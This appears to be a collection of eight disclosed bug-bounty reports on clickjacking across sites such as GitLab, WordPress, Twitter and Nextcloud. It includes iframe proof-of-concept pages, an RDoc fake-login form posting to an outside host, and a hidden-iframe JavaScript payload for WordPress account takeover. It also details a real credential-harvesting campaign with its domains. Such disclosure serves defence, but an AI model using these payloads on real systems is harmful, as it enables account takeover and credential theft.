# UI Redressing (Clickjacking)

_8 reports — High/Critical, disclosed_

### [Clickjacking at  app.lemlist.com](https://hackerone.com/reports/1574017)

- **Report ID:** `1574017`
- **Severity:** High
- **Weakness:** UI Redressing (Clickjacking)
- **Program:** lemlist
- **Reporter:** @scriptsavvy
- **Bounty:** - usd
- **Disclosed:** 2022-05-20T15:04:22.692Z
- **CVE(s):** -

**Vulnerability Information:**

Hi team,

While performing security testing of your website i have found the vulnerability called Clickjacking.
Many URLS are in scope and vulnerable to Clickjacking.

What is Clickjacking ?

Clickjacking (User Interface redress attack, UI redress attack, UI redressing) is a malicious technique of tricking a Web user into clicking on something different from what the user perceives they are clicking on, thus potentially revealing confidential information or taking control of their computer while clicking on seemingly innocuous web pages.

The server didn't return an X-Frame-Options header which means that this website could be at risk of a clickjacking attack. The X-Frame-Options HTTP response header can be used to indicate whether or not a browser should be allowed to render a page in a <frame> or <iframe>. Sites can use this to avoid clickjacking attacks, by ensuring that their content is not embedded into other sites.
This vulnerability affects Web Server.


Vulnerable Urls:
=============

https://app.lemlist.com

Put every above url one by one in the code of iframe, which is given below
```javascript
<html lang="tr-TR">
<kafa>
<meta karakter kümesi="UTF-8">
<title>Çerçeve Yapıyorum</title>
</head>
<body>
<h3>clickjacking güvenlik açığı</h3>
<iframe src="https://app.lemlist.com/teams/tea_sgYr5dZr478x4FQ9K/settings/user/usr_Z3GZ4DDHLLyLyZHj5/users" height="550px" width="700px"></iframe>
</body>
</html>
```

## Impact

Using a similar technique, keystrokes can also be hijacked. With a carefully crafted combination of stylesheets, iframes, and text boxes, a user can be led to believe they are typing in the password to their email or bank account, but are instead typing into an invisible frame controlled by the attacker.

**Summary (researcher):**

Clickjacking at app.lemlist.com
Account Takeover, Account Deletion and Password Change

---

### [Clickjacking to change email address](https://hackerone.com/reports/783191)

- **Report ID:** `783191`
- **Severity:** High
- **Weakness:** UI Redressing (Clickjacking)
- **Program:** Gener8
- **Reporter:** @paramdham
- **Bounty:** - usd
- **Disclosed:** 2022-01-12T08:33:43.087Z
- **CVE(s):** -

**Vulnerability Information:**

##Summary



Clickjacking (User Interface redress attack, UI redress attack, UI redressing) is a malicious technique of tricking a Web user into clicking on something different from what the user perceives they are clicking on, thus potentially revealing confidential information or taking control of their computer while clicking on seemingly innocuous web pages.

It allows remote attackers to do some clickjacking which can be used for adding arbitrary tasks . Why? Almost all of your page has missing X-FRAME-OPTIONS header.

Websites are at risk of a clickjacking attack when they allow content to be embedded within a frame.





##Proof of concept code :- 

Copy the above code and paste it in notepad and save it with .html extention
and open it in browser


<html> 
<head> 
<title>Clickjack test page</title> 
</head> 
<body> 
<p>Website is vulnerable to clickjacking!</p>

<iframe src="https://gener8ads.com/dashboard/account"  sandbox="allow-top-navigation allow-same-origin allow-scripts" width="500" height="500"></iframe> 

</body> 
</html>


Copy and paste above given code and  save it with hack.html and  open it in browser



------------------------------------------------------------------->

Recommendation :- 

Add X-FRAME-OPTIONS header to mitigate the issue

## Impact

An attacker may use this risk to invisibly load the target website into their own site and trick users into clicking on links which they never intended to. An "X-Frame-Options" header should be sent by the server to either deny framing of content, only allow it from the same origin or allow it from a trusted URIs.

---

### [ClickJacking](https://hackerone.com/reports/947690)

- **Report ID:** `947690`
- **Severity:** High
- **Weakness:** UI Redressing (Clickjacking)
- **Program:** Acronis
- **Reporter:** @salna_kuruvi
- **Bounty:** - usd
- **Disclosed:** 2021-03-16T09:44:10.788Z
- **CVE(s):** -

**Vulnerability Information:**

I have found the vulnerability called Clickjacking.

Please find the details below:

Description     

Clickjacking is an exploit in which malicious coding is hidden beneath apparently legitimate buttons or other clickable content on a website.

  OWASP Benchmark   A6- Security Misconfiguration  


Steps to Reproduce   

1.Craft an HTML page and add the following 
( https://www.acronis.com/en-in/ ) of the application within an iframe.

2.Save the file as *.html and run the file.

3.Open the HTML page in a browser.

4.The following attached screenshot shows webiste is in frame.

Please find the attached screenshot for your reference. 

High Level Fix Recommendation

Clickjacking attacks can be avoided by setting the X-Frame-Options header or by using frame busting code which check if the current web page is the top web page (not within a frame).

## Impact

Impact 

Multitude of attacks including key logging and stealing user credentials.

---

### [Cross-site Scripting (XSS) - Stored in RDoc wiki pages](https://hackerone.com/reports/662287)

- **Report ID:** `662287`
- **Severity:** High
- **Weakness:** UI Redressing (Clickjacking)
- **Program:** GitLab
- **Reporter:** @vakzz
- **Bounty:** 3500 usd
- **Disclosed:** 2019-12-16T09:02:35.750Z
- **CVE(s):** -

**Vulnerability Information:**

### Summary

When creating an RDoc wiki page it's possible to use a large number of html tags and attributes that are normally sanitized, when creating a linkable image of the format `{<img src>}[link]`

For example it is possible to specify a `class` attribute when creating an image link:

```rdoc
{
<a href='https://aw.rs/users/signin' class='atwho-view select2-drop-mask pika-select'>
<img height=10000 width=10000></a>
}[a]
```

will generate the following:

```html
<div class="md md-file">
  <p>Full Page link</p>
  <p><a href="a" rel="nofollow"></a><a href="https://aw.rs/users/signin" class="atwho-view select2-drop-mask pika-select" rel="nofollow"><img height="10000" width="10000"></a></p>
</div>
```

This will place a link taking over the entire page and intercept any clicks, `atwho-view select2-drop-mask pika-select` are just some real classes that make the links position absolute with a high z-index.

The `target` attribute could also be set to `_blank` and as there is no `rel="noopener"` [reverse tabnabbing](https://www.owasp.org/index.php/Reverse_Tabnabbing) is also possible.


Another attack that is more likely to work would be to create a form in a modal, which could be used to ask for a username and password:

```rdoc
a form
{
<div class="modal show d-block">
<div class="modal-dialog">
<div class="modal-content">
<div class="modal-header">
<h3 class="page-title">Please Log In</h3>
</div>
<div class="modal-body">
<form class="new-wiki-page" action="http://aw.rs/">
<div class="form-group">
<label for="username"><span>Username</span></label>
<input type="text" name="username" id="username" class="form-control">
<label for="password"><span>Password</span></label>
<input type="password" name="password" id="password" class="form-control">
</div>
<div class="form-actions"><button name="button" type="submit" class="btn btn-success">Login</button></div>
</form>
</div>
</div>
</div>
</div>
}[/]
```

Which produces the following dialog when viewing the page:
{F541421}


### Steps to reproduce

1. Create a wiki on gitlab
1. Add a new RDoc page with the above snippet
1. Save and wait for someone to click it


### Impact
An attacker could trick a user into thinking they had clicked on a gitlab element when they are actually redirected to the attackers site, or be presented with a dialog that will post to an attackers site.

### Examples

Example linking to a fake sign in form:
https://gitlab.com/wbowling/wiki/wikis/home

Example creating a modal form:
https://gitlab.com/wbowling/wiki/wikis/home2

### What is the current *bug* behavior?
When using an image link in RDoc the anchor tag attributes are not sanitized correctly.

### What is the expected *correct* behavior?
They should be correctly sanitized.

### Relevant logs and/or screenshots


### Output of checks

This bug happens on GitLab.com

#### Results of GitLab environment info
```
System information
System:		Ubuntu 16.04
Current User:	git
Using RVM:	no
Ruby Version:	2.6.3p62
Gem Version:	2.7.9
Bundler Version:1.17.3
Rake Version:	12.3.2
Redis Version:	3.2.12
Git Version:	2.21.0
Sidekiq Version:5.2.7
Go Version:	unknown

GitLab information
Version:	12.1.1
Revision:	f9abaa7d833
Directory:	/opt/gitlab/embedded/service/gitlab-rails
DB Adapter:	PostgreSQL
DB Version:	10.7
URL:		http://gitlab-vm.local
HTTP Clone URL:	http://gitlab-vm.local/some-group/some-project.git
SSH Clone URL:	git@gitlab-vm.local:some-group/some-project.git
Using LDAP:	no
Using Omniauth:	yes
Omniauth Providers:

GitLab Shell
Version:	9.3.0
Repository storage paths:
- default: 	/var/opt/gitlab/git-data/repositories
GitLab Shell path:		/opt/gitlab/embedded/service/gitlab-shell
Git:		/opt/gitlab/embedded/bin/git
```

## Impact

Trick users into giving up their account details via a legitimate looking form on gitlab.com

---

### [Viral Direct Message Clickjacking via link truncation leading to capture of both Google credentials & installation of malicious 3rd party Twitter App](https://hackerone.com/reports/643274)

- **Report ID:** `643274`
- **Severity:** High
- **Weakness:** UI Redressing (Clickjacking)
- **Program:** X / xAI
- **Reporter:** @slickrockweb
- **Bounty:** - usd
- **Disclosed:** 2019-10-31T17:12:30.365Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:** [Viral Direct Message Clickjacking via link truncation leading to capture of both Google credentials & installation of malicious 3rd party Twitter App]

**Description:** [Because very long links in direct messages are truncated after 38 characters the malicious actors were able to provide a malicious link in a direct message that appeared as though it was to an authenticated YouTube video and caused a clickjacking scenario to occur. The link caused any users that were already logged into a Google account to be first logged out and then asked to log back in. A malicious Google app captured the account credentials and then redirected the user to the website getmorefollowers.biz (embedded in the initial link query string) which in turn redirected the user to freefollowers.eu domain. This executed a PHP script and /or a javascript which in turn redirected the user to one of at least 10 different randomized malicious 3rd party Twitter apps (see attached file redirect-sequence-from-start.png for the initial redirect sequence). Depending on whether the user was already logged into their Twitter account, the authentication process was potentially done for the user and/or the user only needed to click on the authenticate button. These apps all did essentially the same thing. They generated a couple of followers to the account but also hijacked the account into sending this same malicious link as a Direct message to everyone that it was able to in that account (open DMs and reciprocal follows). Thus creating the virality of the infection and starting the sequence all over again on hundreds of new victims.

Users that weren't already logged into Google were redirected directly to getmorefollowers.biz and then to freefollowers.eu and then to the malicious Twitter app and sent to one of at least 10 different randomized Oauth screens and encouraged to connect to a 3rd party Twitter app that would supposedly provide you free followers (also provided a paid service to increase your followers).

Here is an example "FULL" link we received from a malicious account that we were investigating named @█████████

ONLY FOR YOU Eric JN Ellason {{ https://accounts.youtube.com/accounts/SetSID?89085489=████████&ilo=1&89085489=████&ils=a4cc1b7ed445598f16cef403bb3b0311&ilc=0&Bi06UejC9N=89085489&continue=https%3A%2F%2Fgoogle.com%2Faccounts%2FLogout%3Fcontinue%3Dhttps%253A%252F%252Fappengine.google.com%252F_ah%252Flogout%253Fcontinue%253Dhttps%25253A%25252F%25252Fwww.google.com%25252Furl%25253Fsa%25253Dt%252526rct%25253Dj%252526q%25253D%252526esrc%25253Ds%252526frm%25253D1%252526source%25253Dweb%252526cd%25253D1%252526cad%25253Drja%252526ved%25253D0CDAQFjAA%252526url%25253Dhttp%2525253A%2525252F%2525252Fwww.getmorefollowers.biz%2525252F%252526ei%25253D3meWUs3fGMun0wWr94CoAg%252526usg%25253DAFQjCNFg9bZvpiCSGCVgdaryfriEHS-XEA%252526sig2%25253D8hAat-jqQCQ0Ciz9ywCbEw%252526bvm%25253Dbv.57155469%25252Cd.bGQ&Bi06UejC9N=43992 … }} message id: 92439


What gets displaying and hotlinked in the Direct Message is this:

ONLY FOR YOU Eric JN Ellason { accounts.youtube.com/accounts/SetSI... } message id: 92439

Screenshot attachment (new-DM-infections.png) shows 9 new links sent out as DMs to new victims from another infected account we posted to Twitter.


Here is an older example that we found:

https://accounts.youtube.com/accounts/SetSID?ssdc=1&sidt=ALWU2csbcs9naItQW2g9gJSaN3QCEtSXNR%2F%2FgHRk%2B%2FacQ5RRlR6qkFXVNv1zNoCD4xCsw2zAU7XtQ5nTcoTWLokEO16qm2KqD8dQsKvLJQghxcRG%2BxRGeHymPAwEAWWWIfVpIHIdWWSR7QDaDg%2Fds4CPnpJeHPzg24hAeNHRjj%2BfZUhZClhvopoA9yPv13%2BIKm5QBlCZHinUlFsz%2FffGJEFmLuu4%2Bo5EaQv3xRhD8gTfWKp5uo22CeMXz8K5UH7F5l6RPVND4eX5CO7wRAq7vl6RbM2UoK07CpD9LSIbZV%2FC4%2F9zRx7a1weMOZ1JjtH9I9zUPi2eJdnbPjoplfXQ1WOQtVVCmgmVk2XSZDSPov%2F2hrU6bCT5xdLVGCSkImSRb8bIqtFxN7uXSsAht%2BiRpCk8IlZEvCRrbPk8bDe6hLanwCsKv0sRPHb4IWJkKAAiz6ID8e%2FwV83zvzNXwvz%2FyT4hJ2%2BD%2BVVatg%3D%3D&continue=https%3A%2F%2Fwww.google.com%2Fintl%2Fen%2Fimages%2Flogos%2Faccounts_logo.png&dbus=PK.2
]

## Steps To Reproduce:

(Add details for how we can reproduce the issue)

 1. [Direct message is sent from a reciprocal follow within your account. Presumably can happen to accounts with Open DMs. The direct message, because of link truncation appears to be a Youtube video. Message in general looks like this.  ONLY FOR YOU Eric JN Ellason { accounts.youtube.com/accounts/SetSI... } message id: 92439 ]
 2. [The User who receives this direct message from someone they follow, clicks on the embedded link (in some cases from very trusted sources who have themselves been infected).]
 3. [The link sequence first attempts to log the user out of any Google accounts or apps they are currently logged into. And then asks them to relog back into their Google account, capturing their Google account credentials. Presumably there is a malicious Google app that they have created which in turn continues the sequence and currently eventually sends them to the website www.getmorefollowers.biz . Other domains have been used and will likely be swapped out in the future. We provide a list of 7 domains we believe have been used in this campaign.]
 4. [getmorefollowers.biz currently redirects the user to www.freefollower.eu and specifically this URL www.freefollower.eu/redirect.php. The user will generally be unaware of this redirect and will only see the final Twitter authentication screen to authenticate a 3rd party Twitter app. We were able to short circuit the redirect chain and use just the URL www.freefollower.eu/redirect.php from different VPN locations and with a virgin state browser to identify most of the different malicious 3rd party apps. It appears they randomize sending the user to 1 of at least 10 different 3rd party apps. We document them below in the "Additional Materials" section]
 5. [For users not logged into any Google accounts, they get directly sent to the website www.getmorefollowers.biz and step 4 above continues the sequence ]
 6. [Since the user is presumably already logged into their Twitter account they then get an authentication screen asking them to authenticate the app. It is also possible via malicious javascripts that this process of clicking on the authentication button is completed for them in the background making the user completely unaware of much of this sequence.]
 7. [If the user is not logged into their Twitter account and has javascript disabled I believe the sequence does stop at the freefollower.eu website. Here you can click on the "Signin with Twitter" button to log into your Twitter account and then authenticate this app to have access to your account. Of course this sequence really only happens with security professionals looking into and short circuiting the redirect sequences]

## Impact: [The attacker in this situation has already been able to create a viral attack vector in addition to harvesting thousands of Google account credentials and installing their malicious 3rd party Twitter app on thousands of accounts. Please note this report is also being submitted to the Google Bug Bounty program because part of the attack sequence occurs on their infrastructure.

Once one account is breached that account in turn sends out the malicious link via the authenticated 3rd party Twitter app (we identify the set of randomized apps above) to everyone in their trusted set of reciprocal follows (since the link is sent only via direct message). This greatly increases the trust factor and likely hood a significant number of people that receive this link will click and follow the malicious sequence and continue the viral infection sequence. At the same time the hackers can have their malicious 3rd party Twitter app authenticated within thousands of accounts. Through RiskIQ we were already able to verify that thousands of Twitter accounts within the past month had been breached and infected via this Clickjacking attack. We are attaching a document showing about 1000 accounts that fell victim to this attack (see attachment ███). We have confirmed a handful on this list by finding tweets much like the account reDawn8718 that we have attached here.

We also plan to publish our findings once we are contacted and the issue is resolved in a timely manner.]

## Supporting Material/References:

  * List any additional material (e.g. screenshots, logs, etc.)
  
Web domains used or previously used by these malicious actors.
getmorefollowers.biz
freefollower.eu
www.freeaddme.us
followplanet.us
forfollow.net
followback.us
bestfollowers.in

This domain (pisagor.xyz) was hidden in the sequence and appears to run some kind of a javascript based redirect

Much of this malicious infrastructure is hosted on a Turkish host called "Radore Veri Merkezi Hizmetleri" at the IP address 213.128.89.35. In some examples we found that the Google redirect used the Turkish version of Google (www.google.com.tr).

Here is the list of different Oauth links that were generated from the malicious link that we tested from multiple VPN locations and browser setups. There did not appear to be any victim fingerprinting that we could identify. Rather it appeared to just randomly select 1 of at least 10 different malicious 3rd party app authentications.

https://api.twitter.com/oauth/authenticate?oauth_token=Eqx8ggAAAAAA_RPwAAABa-oLM2U
https://api.twitter.com/oauth/authenticate?oauth_token=dvZwxQAAAAAA_QY2AAABa-odhOo
https://api.twitter.com/oauth/authenticate?oauth_token=ZswiRQAAAAAA_Ra1AAABa-0tVpM

From French VPN
https://api.twitter.com/oauth/authenticate?oauth_token=Zax6iQAAAAAA_RbIAAABa-01v6w

From UAE
https://api.twitter.com/oauth/authenticate?oauth_token=dM77VQAAAAAA_R7oAAABa-1f46I

From Spain
https://api.twitter.com/oauth/authenticate?oauth_token=yw71-wAAAAAA_RbEAAABa-1kLgY

From Japan
https://api.twitter.com/oauth/authenticate?oauth_token=LzZ61gAAAAAA_R7vAAABa-1oktk

From Japan02
https://api.twitter.com/oauth/authenticate?oauth_token=PMUXyQAAAAAA_RuBAAABa-1sLQc

From Japan03
https://api.twitter.com/oauth/authenticate?oauth_token=u18JrQAAAAAA_Ra1AAABa-1vNhg

From South Africa
https://api.twitter.com/oauth/authenticate?oauth_token=Q98N5AAAAAAA_RDoAAABa-1zIGY

From South Africa 02
https://api.twitter.com/oauth/authenticate?oauth_token=TMzbrgAAAAAA_RbIAAABa-13Y2M


3rd Party App Account Names (looks like some may be using hidden unicode for the app name):
app. id 685jjkl55
ila by neta
safety fllowers
100 Hz ap.
gasad. laras.
create followers.
App id 3/825080
service k8625825
bas.yr
tera daranes.

## Impact

The attacker in this situation has already been able to create a viral attack vector in addition to harvesting thousands of Google account credentials and installing their malicious 3rd party Twitter app on thousands of accounts. Please note this report is also being submitted to the Google Bug Bounty program because part of the attack sequence occurs on their infrastructure.

Once one account is breached that account in turn sends out the malicious link via the authenticated 3rd party Twitter app (we identify the set of randomized apps above) to everyone in their trusted set of reciprocal follows (since the link is sent only via direct message). This greatly increases the trust factor and likely hood a significant number of people that receive this link will click and follow the malicious sequence and continue the viral infection sequence. At the same time the hackers can have their malicious 3rd party Twitter app authenticated within thousands of accounts. Through RiskIQ we were already able to verify that thousands of Twitter accounts within the past month had been breached and infected via this Clickjacking attack. We are attaching a document showing about 1000 accounts that fell victim to this attack (see attachment ████). We have confirmed a handful on this list by finding tweets much like the account reDawn8718 that we have attached here.

We also plan to publish our findings once we are contacted and the issue is resolved in a timely manner.

---

### [Account takeover vulnerability by editor role privileged users/attackers via clickjacking](https://hackerone.com/reports/388254)

- **Report ID:** `388254`
- **Severity:** High
- **Weakness:** UI Redressing (Clickjacking)
- **Program:** WordPress
- **Reporter:** @rewanth_cool
- **Bounty:** - usd
- **Disclosed:** 2018-09-03T12:27:11.728Z
- **CVE(s):** -

**Vulnerability Information:**

####Vulnerability -
Editor role privileged users are able to hack into other's account by exploiting clickjacking vulnerability.

####Version-
4.9.7

####Issue-
https://make.wordpress.org/core/handbook/testing/reporting-security-vulnerabilities/#why-are-some-users-allowed-to-post-unfiltered-html
As mentioned per the above link, the editor and admin roles are given permissions to inject arbitary javascript in the posts. Though its a severe vulnerability we can't report about injecting javascript to steal cookies.
**But only the admin roles/users have the permissions to change the details of other users. Due to this vulnerability editor privileged users are even able to do account takeover of other users account.**
Allowing the editor role privileged users to use unfiltered HTML (https://en.support.wordpress.com/code/) exposed a new vulnerability via clickjacking. Impact has been explained clearly in the below section. This attack expects the wordpress user to be logged in before he opens the malicious post link sent by the editor privileged user.

####Reproduction steps-
1. Create two user accounts, one with author/subscriber privileges and other with editor privileges.
2. Get logged in using the editor privileged account and create a new post with the following code.
Replace `159.65.157.23:9080` with your IP address.

```
<iframe src="http://159.65.157.23:9080/wp-admin/profile.php" id="frame" onload="loaded()" style="visibility:hidden"></iframe>

<script>
var MyIFrame = document.getElementById("frame");
var MyIFrameDoc = (MyIFrame.contentWindow || MyIFrame.contentDocument || MyIFrame.document);
function loaded(){
MyIFrameDoc.document.getElementById("your-profile").first_name.value="hacked by rewanthcool"
MyIFrameDoc.document.getElementById("your-profile").submit.click();
alert("Your first name has been changed to " + MyIFrameDoc.document.getElementById("your-profile").first_name.value + ". Visit http://159.65.157.23:9080/wp-admin/profile.php for confirmation");
}
</script>
```

3. Now click on `publish` button to publish the URL. Copy the URL to the malicious post.
4. Now get logged in as another user with author/subscriber privileged roles in another browser/incognito tab.
5. Now paste the malicious URL (copied in step 3) in this browser and press enter.
6. Boom !! Now the open the profile page of the author/subscriber privileged user `http://159.65.157.23:9080/wp-admin/profile.php` and you can see his firstname got changed to rewanthcool.

**Similarly you can change the email of the user** by changing `first_name` parameter in above payload to `email`. So, now your payload becomes, `MyIFrameDoc.document.getElementById("your-profile").email.value="attacker_rewanthcool@gmail.com"`. By submitting this payload, you will get a confirmation email link to your profile and you can takeover the victim's account.

###NOTE-
CSRF protection adds `_wpnonce` to prevent these kind of CSRF attacks but since we are handling everything in an iframe bypasses this CSRF protection as it generates a new valid `_wpnonce` while it gets loaded in the iframe.

In the above payload, the attacker was able to change the firstname of the victim. That's just a sample. In worst cases, there are two main fields in the same page. They are
1. Email-id
2. New Password which generates new password by click on a button.
3. Sessions: Logout everywhere else.

By using the combination of hidden iframe and javascript, the attacker can craft a similar payload and takeover a wordpress users account.

####Mitigation-
Disallow editor privileged users from injecting iframes into the pages/posts by changing the `X-Frame-Options` header to `DENY`.

## Impact

Editor role users can access other users account and change his personal information, change this settings, etc just by making the user to visit a nicely crafted page post.

###Worst-case attack scenario
Most dangerous impact can be **account takeover** by changing the email-id and password of the victim by injecting an iframe.

###Detailed explanation of vulnerability-
CSRF on edit-profile has been smartly handled by wordpress developers by adding `_wpnonce` to it. But allowing the editor privileged users to inject iframes into the posts bypasses this CSRF protection.

A hidden iframe can be put in a post and its URL can be sent to the victim(lower privileged user like author, subscriber, etc). Once the victim clicks on the URL sent by the attacker, the hidden iframe will be submitting a javascript request to change the victim's firstname and lastname. In worst cases, the attacker can submit two requests via iframe using javascript to make account takeover.
1. First request, to generate new password via hidden iframe.. This disabled the victim from using old password.
2. Second request, to change the victim's email id to attacker's email id via hidden iframe. This completely disables to user to use the `forgot-password` option as the email id has been changed.
3. Attacker now clicks on `forgot-password` and a reset email will be sent to the attackers email id.
4. Account takeover completed and editor privileged user hacked the other wordpress users with other privileges.

###Bonus feature/exploit to lock the victim-
There's an option to logout from everywhere in the edit-profile page, by clicking on that the attacker can make sure that the victim is not logged into any other accounts after he changed the password.

Only admin privileged users should be having the abilities to change the personal information like usernames, email-id, etc of other accounts but due to this vulnerability the editor privileged user is also getting the same amount of privileges as admin privileged user which definitely is a bad practice.

Considering the high severity of the issue, I'm sure this will be considered as an exceptional report with immediate fix.

---

### [Clickjacking on Mixmax.com](https://hackerone.com/reports/234713)

- **Report ID:** `234713`
- **Severity:** High
- **Weakness:** UI Redressing (Clickjacking)
- **Program:** Mixmax
- **Reporter:** @mrnull1337
- **Bounty:** - usd
- **Disclosed:** 2017-06-13T05:54:44.911Z
- **CVE(s):** -

**Summary (team):**

mixmax.com was vulnerable to clickjacking.

---

### [Clickjacking In https://demo.nextcloud.com](https://hackerone.com/reports/222762)

- **Report ID:** `222762`
- **Severity:** Critical
- **Weakness:** UI Redressing (Clickjacking)
- **Program:** Nextcloud
- **Reporter:** @xsszeeshan
- **Bounty:** - usd
- **Disclosed:** 2017-05-20T18:44:03.550Z
- **CVE(s):** -

**Vulnerability Information:**

Hi Nextcloud,

Clickjacking In https://demo.nextcloud.com

This Is Zeeshan,An Ethical Hacker, I Have Found A Security Issue In Your Site

Clickjacking In nextcloud https://demo.nextcloud.com Page

<html>
<head>

<body>
<p>Website is vulnerable to clickjacking!</p>
<iframe src="https://demo.nextcloud.com" width="500" height="500"></iframe>

</body>
</html>

Please Fix It As Soon As Possible

Best Regards,
Zeeshan Waheed
xsszeeshan@gmail.com

---
